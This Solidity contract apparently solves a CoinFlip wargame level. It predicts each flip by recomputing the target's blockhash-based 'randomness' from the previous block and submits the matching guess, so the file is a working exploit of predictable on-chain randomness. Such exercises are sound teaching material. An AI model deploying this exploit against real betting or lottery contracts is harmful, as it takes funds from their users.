// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract Test {
    using SafeMath for uint256;
    CoinFlip public coinFlip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 public currNumber = 0;

    constructor(address conFlipAddress) public {
        coinFlip = CoinFlip(conFlipAddress);
    }

    function IncreaseItBy1() public {
        coinFlip.flip(getBool());
    }

    function getBool() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip1 = blockValue.div(FACTOR);
        bool side = coinFlip1 == 1 ? true : false;
        return side;
    }
}
